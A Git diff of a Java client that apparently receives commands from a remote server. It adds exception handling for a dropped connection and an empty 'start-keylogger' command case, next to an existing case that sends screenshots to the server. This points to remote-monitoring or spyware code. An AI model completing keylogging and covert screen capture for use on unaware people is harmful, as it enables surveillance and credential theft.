@@ -1,7 +1,9 @@
 package app;
 
+import java.io.EOFException;
 import java.io.IOException;
 import java.net.Socket;
+import java.net.SocketException;
 
 import exception.ServerOfflineException;
 import network.Connection;
@@ -49,9 +51,20 @@ public class Client {
     }
 
     private static void handleServerCommand() throws ServerOfflineException {
-        String command = connection.readMessage().getCommand();
+        String command = null;
+        try {
+            command = connection.readMessage().getCommand();
+        } catch(SocketException | EOFException e) {
+            Client.disconnected();
+            throw new ServerOfflineException("Server went offline");
+        } catch(IOException | ClassNotFoundException ex) {
+            ex.printStackTrace();
+        }
 
         switch(command) {
+            case "start-keylogger":
+
+                break;
             case "screen":
                 ScreenUtils.sendScreenshot(connection, false);
                 break;
